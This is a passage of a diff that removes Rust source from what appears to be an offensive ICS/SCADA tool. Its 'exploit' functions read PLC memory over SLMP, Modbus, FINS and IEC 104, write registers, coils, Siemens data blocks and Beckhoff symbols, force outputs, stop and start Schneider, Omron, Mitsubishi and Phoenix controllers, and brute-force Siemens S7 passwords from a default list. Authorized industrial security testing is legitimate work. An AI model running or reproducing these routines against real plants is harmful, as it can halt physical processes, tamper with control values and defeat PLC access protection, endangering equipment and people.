-        return Ok(all_slmp_ranges());
-    }
-
-    let mut ranges = Vec::new();
-    for token in spec.split(',') {
-        let token = token.trim();
-        if token.is_empty() {
-            return Err(format_slmp_map_usage());
-        }
-        let parts: Vec<_> = token.split(':').map(str::trim).collect();
-        if parts.len() != 3 {
-            return Err(format_slmp_map_usage());
-        }
-        let (device, kind) = parse_slmp_device(parts[0]).ok_or_else(|| {
-            format!(
-                "unknown SLMP device '{}'. {}",
-                parts[0],
-                format_slmp_map_usage()
-            )
-        })?;
-        let start = parts[1].parse::<u32>().map_err(|_| {
-            format!(
-                "invalid start address '{}'. {}",
-                parts[1],
-                format_slmp_map_usage()
-            )
-        })?;
-        let count = parts[2]
-            .parse::<u32>()
-            .map_err(|_| format!("invalid count '{}'. {}", parts[2], format_slmp_map_usage()))?;
-        if start >= SLMP_ADDRESS_SPACE {
-            return Err(format!(
-                "start address {start} is outside 0..16777215. {}",
-                format_slmp_map_usage()
-            ));
-        }
-        if count == 0 || count > SLMP_ADDRESS_SPACE - start {
-            return Err(format!(
-                "count {count} at start {start} is outside the SLMP address space. {}",
-                format_slmp_map_usage()
-            ));
-        }
-        ranges.push(SlmpMapRange::new(device, kind, start, count));
-    }
-
-    if ranges.is_empty() {
-        Err(format_slmp_map_usage())
-    } else {
-        Ok(ranges)
-    }
-}
-
-fn format_slmp_map_usage() -> String {
-    "use quick, common, all, or device:start:count entries like d:0:100,m:0:128,w:0:64".to_string()
-}
-
-fn slmp_map_chunks(range: SlmpMapRange) -> Vec<(u32, u16)> {
-    let mut chunks = Vec::new();
-    let mut start = range.start;
-    let mut remaining = range.count;
-    let max_count = u32::from(range.chunk_limit());
-    while remaining > 0 {
-        let count = remaining.min(max_count);
-        chunks.push((start, u16::try_from(count).unwrap_or(u16::MAX)));
-        start += count;
-        remaining -= count;
-    }
-    chunks
-}
-
-fn exploit_slmp_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::slmp;
-
-    let ranges = match parse_slmp_map_input(input) {
-        Ok(ranges) => ranges,
-        Err(e) => {
-            out(&format!("[-] {e}"));
-            return;
-        }
-    };
-    let mode = input.trim();
-    let mode = if mode.is_empty() { "quick" } else { mode };
-    let effective_port = if port == 0 { slmp::DEFAULT_PORT } else { port };
-    out(&format!(
-        "[*] SLMP map on {ip}:{effective_port} ({mode}, read-only)..."
-    ));
-    out("[*] SLMP exposes device memory areas, not semantic tag names; this maps readable ranges.");
-
-    let mut points_addr = Vec::<String>::new();
-    let mut points_type = Vec::<String>::new();
-    let mut points_value = Vec::<String>::new();
-    let mut readable_chunks = 0usize;
-    let mut readable_values = 0usize;
-    let mut failed_chunks = 0usize;
-    let mut hidden_errors = 0usize;
-    let mut interesting_total = 0usize;
-    let mut interesting_printed = 0usize;
-    let mut interesting_header_printed = false;
-
-    for range in ranges {
-        let chunks = slmp_map_chunks(range);
-        out(&format!(
-            "[*] {} {}..{} ({} value(s), {} chunk(s))",
-            range.device,
-            range.display_start(),
-            range.display_end(),
-            range.count,
-            chunks.len()
-        ));
-        for (start, count) in chunks {
-            let result = match range.kind {
-                SlmpDeviceKind::Word => {
-                    slmp::read_word_devices(ip, port, range.device, start, count)
-                }
-                SlmpDeviceKind::Bit => slmp::read_bit_devices(ip, port, range.device, start, count),
-            };
-            match result {
-                Ok(vals) => {
-                    readable_chunks += 1;
-                    readable_values += vals.len();
-                    interesting_total += emit_slmp_interesting_limited(
-                        &vals,
-                        out,
-                        &mut interesting_printed,
-                        &mut interesting_header_printed,
-                    );
-                    for val in vals {
-                        points_addr.push(val.display);
-                        points_type.push(range.point_type().to_string());
-                        points_value.push(val.value_str);
-                    }
-                }
-                Err(e) => {
-                    failed_chunks += 1;
-                    if failed_chunks <= MODBUS_MAP_ERROR_OUTPUT_CAP {
-                        let end = start + u32::from(count) - 1;
-                        out(&format!(
-                            "[-] {}{}..{}{}: {e}",
-                            range.device, start, range.device, end
-                        ));
-                    } else {
-                        hidden_errors += 1;
-                    }
-                }
-            }
-        }
-    }
-
-    if hidden_errors > 0 {
-        out(&format!(
-            "[!] {hidden_errors} more unreadable chunk(s) omitted from output"
-        ));
-    }
-    if interesting_total > MODBUS_MAP_VALUE_OUTPUT_CAP {
-        out(&format!(
-            "[*] {} more non-default value(s) omitted from output",
-            interesting_total - MODBUS_MAP_VALUE_OUTPUT_CAP
-        ));
-    }
-
-    let points: Vec<(&str, Option<&str>, &str)> = points_addr
-        .iter()
-        .zip(points_type.iter())
-        .zip(points_value.iter())
-        .map(|((addr, typ), value)| (addr.as_str(), Some(typ.as_str()), value.as_str()))
-        .collect();
-    if !points.is_empty() {
-        save_and_diff(ip, "slmp", &points, out);
-    }
-
-    if readable_values == 0 {
-        out("[!] No requested SLMP ranges were readable");
-    } else if interesting_total == 0 {
-        out(&format!(
-            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); all values were zero/OFF"
-        ));
-    } else {
-        out(&format!(
-            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); {interesting_total} non-default value(s) surfaced"
-        ));
-    }
-    if failed_chunks > 0 {
-        out(&format!("[!] {failed_chunks} chunk(s) were unreadable"));
-    }
-}
-
-fn emit_slmp_interesting_limited(
-    vals: &[casket::vendors::mitsubishi::slmp::SlmpValue],
-    out: &impl Fn(&str),
-    printed: &mut usize,
-    header_printed: &mut bool,
-) -> usize {
-    let mut total = 0usize;
-    for v in vals.iter().filter(|v| v.raw != 0) {
-        total += 1;
-        if *printed < MODBUS_MAP_VALUE_OUTPUT_CAP {
-            if !*header_printed {
-                out("[*] Non-default SLMP values:");
-                let [hdr, sep] = slmp_header();
-                out(&hdr);
-                out(&sep);
-                *header_printed = true;
-            }
-            out(&fmt_slmp_row(v));
-            *printed += 1;
-        }
-    }
-    total
-}
-
-fn collect_modbus_points(
-    table: ModbusTable,
-    typ: &str,
-    regs: &[casket::core::modbus::ModbusRegister],
-    addrs: &mut Vec<String>,
-    types: &mut Vec<String>,
-    values: &mut Vec<String>,
-) {
-    for r in regs {
-        addrs.push(table.point_key(u32::from(r.address)));
-        types.push(typ.to_string());
-        let value = match table {
-            ModbusTable::Holding | ModbusTable::Input => r.raw.to_string(),
-            ModbusTable::Coil | ModbusTable::Discrete => r.value_str.clone(),
-        };
-        values.push(value);
-    }
-}
-
-fn exploit_modbus_holding(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
-    let start = start_s.trim().parse::<u16>().unwrap_or(0);
-    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
-    out(&format!(
-        "[*] Reading {count} holding registers from {ip} (start={start})..."
-    ));
-    match modbus::read_holding_registers(ip, port, start, count) {
-        Ok(regs) => {
-            let [hdr, sep] = modbus_header();
-            out(&hdr);
-            out(&sep);
-            for r in &regs {
-                out(&fmt_modbus_row(r));
-            }
-            out(&sep);
-            out(&format!("[+] {} register(s)", regs.len()));
-            let addrs: Vec<String> = regs
-                .iter()
-                .map(|r| ModbusTable::Holding.point_key(u32::from(r.address)))
-                .collect();
-            let vals: Vec<String> = regs.iter().map(|r| r.raw.to_string()).collect();
-            let points: Vec<(&str, Option<&str>, &str)> = addrs
-                .iter()
-                .zip(vals.iter())
-                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str()))
-                .collect();
-            save_and_diff(ip, "modbus", &points, out);
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_modbus_coils(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
-    let start = start_s.trim().parse::<u16>().unwrap_or(0);
-    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
-    out(&format!(
-        "[*] Reading {count} coils from {ip} (start={start})..."
-    ));
-    match modbus::read_coils(ip, port, start, count) {
-        Ok(regs) => {
-            let [hdr, sep] = modbus_header();
-            out(&hdr);
-            out(&sep);
-            for r in &regs {
-                out(&fmt_modbus_row(r));
-            }
-            out(&sep);
-            out(&format!("[+] {} coil(s)", regs.len()));
-            let addrs: Vec<String> = regs
-                .iter()
-                .map(|r| ModbusTable::Coil.point_key(u32::from(r.address)))
-                .collect();
-            let vals: Vec<String> = regs.iter().map(|r| r.value_str.clone()).collect();
-            let points: Vec<(&str, Option<&str>, &str)> = addrs
-                .iter()
-                .zip(vals.iter())
-                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
-                .collect();
-            save_and_diff(ip, "modbus", &points, out);
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_modbus_input(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "100"));
-    let start = start_s.trim().parse::<u16>().unwrap_or(0);
-    let count = count_s.trim().parse::<u16>().unwrap_or(100).min(125);
-    out(&format!(
-        "[*] Reading {count} input registers from {ip} (start={start})..."
-    ));
-    match modbus::read_input_registers(ip, port, start, count) {
-        Ok(regs) => {
-            let [hdr, sep] = modbus_header();
-            out(&hdr);
-            out(&sep);
-            for r in &regs {
-                out(&fmt_modbus_row(r));
-            }
-            out(&sep);
-            out(&format!("[+] {} register(s)", regs.len()));
-            let addrs: Vec<String> = regs
-                .iter()
-                .map(|r| ModbusTable::Input.point_key(u32::from(r.address)))
-                .collect();
-            let vals: Vec<String> = regs.iter().map(|r| r.raw.to_string()).collect();
-            let points: Vec<(&str, Option<&str>, &str)> = addrs
-                .iter()
-                .zip(vals.iter())
-                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str()))
-                .collect();
-            save_and_diff(ip, "modbus", &points, out);
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── New Phoenix exploits ────────────────────────────────────────────────────
-
-fn exploit_modbus_discrete(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
-    let start = start_s.trim().parse::<u16>().unwrap_or(0);
-    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(2000);
-    out(&format!(
-        "[*] Reading {count} discrete inputs from {ip} (start={start})..."
-    ));
-    match modbus::read_discrete_inputs(ip, port, start, count) {
-        Ok(regs) => {
-            let [hdr, sep] = modbus_header();
-            out(&hdr);
-            out(&sep);
-            for r in &regs {
-                out(&fmt_modbus_row(r));
-            }
-            out(&sep);
-            out(&format!("[+] {} discrete input(s)", regs.len()));
-            let addrs: Vec<String> = regs
-                .iter()
-                .map(|r| ModbusTable::Discrete.point_key(u32::from(r.address)))
-                .collect();
-            let vals: Vec<String> = regs.iter().map(|r| r.value_str.clone()).collect();
-            let points: Vec<(&str, Option<&str>, &str)> = addrs
-                .iter()
-                .zip(vals.iter())
-                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
-                .collect();
-            save_and_diff(ip, "modbus", &points, out);
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_phoenix_control_ilc150(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::phoenix::control;
-    let (action, start_type) = input.split_once(':').unwrap_or((input, "cold"));
-    out(&format!("[*] Sending ILC150 '{action}' command to {ip}..."));
-    match control::control_ilc150(ip, port, action, start_type) {
-        Ok(state) => out(&format!("[+] PLC state: {state}")),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_phoenix_control_ilc390(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::phoenix::control;
-    out(&format!("[*] Sending ILC390 '{input}' command to {ip}..."));
-    match control::control_ilc390(ip, port, input) {
-        Ok(state) => out(&format!("[+] PLC state: {state}")),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── New Mitsubishi exploits ─────────────────────────────────────────────────
-
-fn exploit_mitsubishi_set_pause(ip: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::control;
-    let iface = NetworkInterface {
-        name: "auto".into(),
-        ip: local_ip_for(ip),
-        netmask: "255.255.255.0".into(),
-    };
-    out(&format!("[*] Setting Mitsubishi to pause on {ip}..."));
-    match control::set_state_ip(&iface, ip, "pause") {
-        Ok(true) => out("[+] State set to pause"),
-        Ok(false) => out("[!] Command sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_mitsubishi_read_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::slmp;
-    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "50"));
-    let start = start_s.trim().parse::<u32>().unwrap_or(0);
-    let count = count_s.trim().parse::<u16>().unwrap_or(50).min(960);
-    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
-    out(&format!("[*] Reading D{start}..D{end} from {ip}..."));
-    match slmp::read_word_devices(ip, port, "D", start, count) {
-        Ok(vals) => {
-            let [hdr, sep] = slmp_header();
-            out(&hdr);
-            out(&sep);
-            for v in &vals {
-                out(&fmt_slmp_row(v));
-            }
-            out(&sep);
-            out(&format!("[+] {} word(s)", vals.len()));
-            let addrs: Vec<String> = vals.iter().map(|v| v.display.clone()).collect();
-            let strs: Vec<String> = vals.iter().map(|v| v.raw.to_string()).collect();
-            let points: Vec<(&str, Option<&str>, &str)> = addrs
-                .iter()
-                .zip(strs.iter())
-                .map(|(a, v)| (a.as_str(), Some("UINT16"), v.as_str()))
-                .collect();
-            save_and_diff(ip, "slmp", &points, out);
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_mitsubishi_read_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::slmp;
-    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "64"));
-    let start = start_s.trim().parse::<u32>().unwrap_or(0);
-    let count = count_s.trim().parse::<u16>().unwrap_or(64).min(3584);
-    let end = start.saturating_add(u32::from(count)).saturating_sub(1);
-    out(&format!("[*] Reading M{start}..M{end} from {ip}..."));
-    match slmp::read_bit_devices(ip, port, "M", start, count) {
-        Ok(vals) => {
-            let [hdr, sep] = slmp_header();
-            out(&hdr);
-            out(&sep);
-            for v in &vals {
-                out(&fmt_slmp_row(v));
-            }
-            out(&sep);
-            out(&format!("[+] {} bit(s)", vals.len()));
-            let addrs: Vec<String> = vals.iter().map(|v| v.display.clone()).collect();
-            let strs: Vec<String> = vals.iter().map(|v| v.value_str.clone()).collect();
-            let points: Vec<(&str, Option<&str>, &str)> = addrs
-                .iter()
-                .zip(strs.iter())
-                .map(|(a, v)| (a.as_str(), Some("BOOL"), v.as_str()))
-                .collect();
-            save_and_diff(ip, "slmp", &points, out);
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── Modbus write exploits ────────────────────────────────────────────────────
-
-fn exploit_modbus_write_coil(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-    let (addr_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
-    let addr: u16 = if let Ok(a) = addr_s.trim().parse() { a } else {
-        out(&format!(
-            "[-] Invalid coil address '{}': must be a number 0\u{2013}65535 (format: addr:on|off)",
-            addr_s.trim()
-        ));
-        return;
-    };
-    let on = !state_s.trim().eq_ignore_ascii_case("off");
-    out(&format!(
-        "[*] Writing coil {addr} = {} on {ip}...",
-        if on { "ON" } else { "OFF" }
-    ));
-    match modbus::write_single_coil(ip, port, addr, on) {
-        Ok(()) => out(&format!("[+] Coil {addr} written")),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_modbus_write_register(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-    let (addr_s, val_s) = input.split_once(':').unwrap_or((input, "0"));
-    let addr: u16 = if let Ok(a) = addr_s.trim().parse() { a } else {
-        out(&format!(
-            "[-] Invalid register address '{}': must be a number 0\u{2013}65535 (format: addr:value)",
-            addr_s.trim()
-        ));
-        return;
-    };
-    let value: u16 = if let Ok(v) = val_s.trim().parse() { v } else {
-        out(&format!(
-            "[-] Invalid register value '{}': must be a decimal 0\u{2013}65535",
-            val_s.trim()
-        ));
-        return;
-    };
-    out(&format!("[*] Writing register {addr} = {value} on {ip}..."));
-    match modbus::write_single_register(ip, port, addr, value) {
-        Ok(()) => out(&format!("[+] Register {addr} written")),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_modbus_write_registers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
-    let start = start_s.trim().parse::<u16>().unwrap_or(0);
-    let values: Vec<u16> = vals_s
-        .split(',')
-        .filter_map(|s| s.trim().parse::<u16>().ok())
-        .collect();
-    if values.is_empty() {
-        out("[-] No valid register values provided (format: start:v0,v1,...)");
-        return;
-    }
-    out(&format!(
-        "[*] Writing {} registers starting at {start} on {ip}...",
-        values.len()
-    ));
-    match modbus::write_multiple_registers(ip, port, start, &values) {
-        Ok(n) => out(&format!("[+] {n} register(s) written")),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── Schneider FC90 exploits ──────────────────────────────────────────────────
-
-fn exploit_fc90_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modicon_fc90;
-    out(&format!(
-        "[*] FC90 STOP command to {ip} (M340/Quantum/Premium)..."
-    ));
-    match modicon_fc90::stop_plc(ip, port) {
-        Ok(true) => out("[+] PLC stopped (ack received)"),
-        Ok(false) => out("[!] Command sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_fc90_start(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modicon_fc90;
-    out(&format!(
-        "[*] FC90 START command to {ip} (M340/Quantum/Premium)..."
-    ));
-    match modicon_fc90::start_plc(ip, port) {
-        Ok(true) => out("[+] PLC started (ack received)"),
-        Ok(false) => out("[!] Command sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_fc90_stop_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modicon_fc90;
-    out(&format!("[*] FC90 STOP TM221 to {ip}..."));
-    match modicon_fc90::stop_tm221(ip, port) {
-        Ok(true) => out("[+] TM221 stopped"),
-        Ok(false) => out("[!] Command sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_fc90_start_tm221(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modicon_fc90;
-    out(&format!("[*] FC90 START TM221 to {ip}..."));
-    match modicon_fc90::start_tm221(ip, port) {
-        Ok(true) => out("[+] TM221 started"),
-        Ok(false) => out("[!] Command sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_fc90_force(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modicon_fc90::{self, ForceState};
-    let (byte_s, state_s) = input.split_once(':').unwrap_or((input, "on"));
-    let output_byte =
-        u8::from_str_radix(byte_s.trim().trim_start_matches("0x"), 16).unwrap_or(0x11);
-    let state = match state_s.trim().to_lowercase().as_str() {
-        "off" => ForceState::Off,
-        "unforce" => ForceState::Unforce,
-        _ => ForceState::On,
-    };
-    out(&format!(
-        "[*] FC90 Force output 0x{output_byte:02x} to {state_s} on {ip}..."
-    ));
-    match modicon_fc90::force_output_bit(ip, port, output_byte, state) {
-        Ok(true) => out("[+] Force command sent"),
-        Ok(false) => out("[!] Command sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── SLMP write exploits ──────────────────────────────────────────────────────
-
-fn exploit_slmp_write_d(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::slmp;
-    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
-    let start = start_s.trim().parse::<u32>().unwrap_or(0);
-    let values: Vec<u16> = vals_s
-        .split(',')
-        .filter_map(|s| s.trim().parse::<u16>().ok())
-        .collect();
-    if values.is_empty() {
-        out("[-] No valid values provided (format: start:v0,v1,...)");
-        return;
-    }
-    out(&format!(
-        "[*] Writing {} D registers starting at D{start} on {ip}...",
-        values.len()
-    ));
-    match slmp::write_word_devices(ip, port, "D", start, &values) {
-        Ok(()) => out("[+] D registers written"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_slmp_write_m(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::slmp;
-    let (start_s, bits_s) = input.split_once(':').unwrap_or(("0", input));
-    let start = start_s.trim().parse::<u32>().unwrap_or(0);
-    let values: Vec<bool> = bits_s
-        .trim()
-        .chars()
-        .filter_map(|c| match c {
-            '0' => Some(false),
-            '1' => Some(true),
-            _ => None,
-        })
-        .collect();
-    if values.is_empty() {
-        out("[-] No valid bits provided (format: start:0101...)");
-        return;
-    }
-    out(&format!(
-        "[*] Writing {} M bits starting at M{start} on {ip}...",
-        values.len()
-    ));
-    match slmp::write_bit_devices(ip, port, "M", start, &values) {
-        Ok(()) => out("[+] M bits written"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── Siemens DB write exploit ─────────────────────────────────────────────────
-
-fn exploit_siemens_write_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
-    let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
-    let db_str = parts.first().copied().unwrap_or("DB1");
-    let db_num = db_str
-        .trim_start_matches(|c: char| c.is_alphabetic())
-        .parse::<u16>()
-        .unwrap_or(1);
-    let offset = parts
-        .get(1)
-        .and_then(|s| s.parse::<u16>().ok())
-        .unwrap_or(0);
-    let hex_data = parts.get(2).copied().unwrap_or("");
-    let data: Vec<u8> = hex_data
-        .as_bytes()
-        .chunks(2)
-        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
-        .collect();
-    if data.is_empty() {
-        out("[-] No data to write (format: DB1:offset:hexbytes)");
-        return;
-    }
-    out(&format!(
-        "[*] Writing {} byte(s) to DB{db_num}:{offset} on {ip}:{port}...",
-        data.len()
-    ));
-    match s7comm::write_data_block(ip, db_num, offset, &data, port, 5, password.as_deref()) {
-        Ok(true) => out("[+] DB write acknowledged"),
-        Ok(false) => out("[!] Write sent: PLC did not acknowledge"),
-        Err(e) => {
-            if s7comm::probe_auth_required(ip, port, 5) {
-                out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
-            } else {
-                out(&format!("[-] {e}"));
-            }
-        }
-    }
-}
-
-fn exploit_siemens_try_defaults(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use crate::creds;
-    use casket::vendors::default_creds;
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    out(&format!(
-        "[*] Probing {ip}:{port} for S7Comm access protection..."
-    ));
-    if !s7comm::probe_auth_required(ip, port, 5) {
-        out("[*] No access protection detected: no password needed");
-        return;
-    }
-    out("[!] Access protection active: trying passwords...");
-    let loaded = creds::load();
-    let all_passwords: Vec<&str> = loaded
-        .siemens
-        .passwords
-        .iter()
-        .map(std::string::String::as_str)
-        .chain(default_creds::SIEMENS_S7_PASSWORDS.iter().copied())
-        .collect();
-    if !loaded.siemens.passwords.is_empty() {
-        out(&format!(
-            "[*] {} user-supplied + {} built-in passwords",
-            loaded.siemens.passwords.len(),
-            default_creds::SIEMENS_S7_PASSWORDS.len()
-        ));
-    }
-    for &pw in &all_passwords {
-        let display = if pw.is_empty() { "(empty)" } else { pw };
-        let state = s7comm::get_cpu_state(ip, port, 5, Some(pw));
-        if state != "Unknown" {
-            out(&format!("[+] Password accepted: \"{display}\""));
-            out(&format!("    CPU State: {state}"));
-            out(&format!("[CRED] :{pw}"));
-            return;
-        }
-    }
-    out(&format!(
-        "[-] None of the {} passwords worked",
-        all_passwords.len()
-    ));
-    out("    Add custom passwords to ~/.config/scadaver/creds.toml [siemens] section");
-}
-
-// ─── Beckhoff write symbol exploit ───────────────────────────────────────────
-
-fn exploit_beckhoff_write_symbol(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::beckhoff::{ads, scan};
-    let local_netid = ads::build_local_netid(&local_ip_for(ip));
-    let (sym_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
-    let value_bytes: Vec<u8> = hex_val
-        .as_bytes()
-        .chunks(2)
-        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
-        .collect();
-    if value_bytes.is_empty() {
-        out("[-] No valid hex bytes (format: SymbolName=hexvalue)");
-        return;
-    }
-    out(&format!("[*] Discovering {ip} for ADS write..."));
-    let Some(dev) = scan::discover_ip_with_port(ip, 3, true, port)
-        .ok()
-        .and_then(|mut v| {
-            if v.is_empty() {
-                None
-            } else {
-                Some(v.remove(0))
-            }
-        })
-    else {
-        out("[-] No Beckhoff device responded");
-        return;
-    };
-    out(&format!(
-        "[*] Writing symbol '{sym_name}' ({} bytes)...",
-        value_bytes.len()
-    ));
-    match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
-        Ok(true) => out("[+] Symbol written"),
-        Ok(false) => out("[!] Write sent: ADS error code returned"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── Omron FINS exploits ──────────────────────────────────────────────────────
-
-fn exploit_omron_info(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::omron::fins;
-    out(&format!("[*] Getting Omron device info from {ip}..."));
-    match fins::get_device_info_tcp(ip, port) {
-        Ok(dev) => {
-            out(&format!("  Model:    {}", dev.model));
-            out(&format!("  Version:  {}", dev.version));
-            out(&format!("  Node:     0x{:02x}", dev.node_addr));
-            out("[+] Device info retrieved");
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_omron_read_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::omron::fins;
-    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "10"));
-    let start = start_s.trim().parse::<u16>().unwrap_or(0);
-    let count = count_s.trim().parse::<u16>().unwrap_or(10).min(100);
-    out(&format!(
-        "[*] Reading DM{start}..DM{} from {ip}...",
-        start + count - 1
-    ));
-    match fins::read_dm_words(ip, port, 0, start, count) {
-        Ok(vals) => {
-            out(&format!("  {:<8}  {:<8}  {}", "Address", "Dec", "Hex"));
-            out(&format!("  {:─<8}  {:─<8}  {:─<6}", "", "", ""));
-            for (i, &v) in vals.iter().enumerate() {
-                out(&format!("  DM{:<6}  {:<8}  {v:#06x}", start + u16::try_from(i).unwrap_or(u16::MAX), v));
-            }
-            out(&format!("[+] {} word(s)", vals.len()));
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_omron_write_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::omron::fins;
-    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
-    let start = start_s.trim().parse::<u16>().unwrap_or(0);
-    let values: Vec<u16> = vals_s
-        .split(',')
-        .filter_map(|s| s.trim().parse::<u16>().ok())
-        .collect();
-    if values.is_empty() {
-        out("[-] No valid values provided (format: start:v0,v1,...)");
-        return;
-    }
-    out(&format!(
-        "[*] Writing {} DM word(s) at DM{start} on {ip}...",
-        values.len()
-    ));
-    match fins::write_dm_words(ip, port, 0, start, &values) {
-        Ok(()) => out("[+] DM words written"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_omron_cpu_status(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::omron::fins;
-    out(&format!("[*] Reading CPU status from {ip}..."));
-    match fins::get_cpu_state(ip, port, 0) {
-        Ok(state) => out(&format!("[+] CPU State: {state}")),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_omron_cpu_run(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::omron::fins;
-    out(&format!(
-        "[*] Setting Omron CPU to RUN (Monitor mode) on {ip}..."
-    ));
-    match fins::set_cpu_mode(ip, port, 0, true) {
-        Ok(true) => out("[+] CPU set to Monitor/Run mode"),
-        Ok(false) => out("[!] Command sent: FINS error returned"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_omron_cpu_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::omron::fins;
-    out(&format!("[*] Setting Omron CPU to STOP on {ip}..."));
-    match fins::set_cpu_mode(ip, port, 0, false) {
-        Ok(true) => out("[+] CPU stopped"),
-        Ok(false) => out("[!] Command sent: FINS error returned"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── IEC 60870-5-104 exploits ─────────────────────────────────────────────────
-
-fn exploit_iec104_gi(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::iec104::client;
-    out(&format!("[*] IEC 104 General Interrogation to {ip}..."));
-    match client::connect(ip, port) {
-        Ok(mut sess) => {
-            out("[+] STARTDT confirmed");
-            match client::general_interrogation(&mut sess) {
-                Ok(objs) => {
-                    for obj in &objs {
-                        out(&format!(
-                            "  IOA {:>6}: type=0x{:02x} value={}",
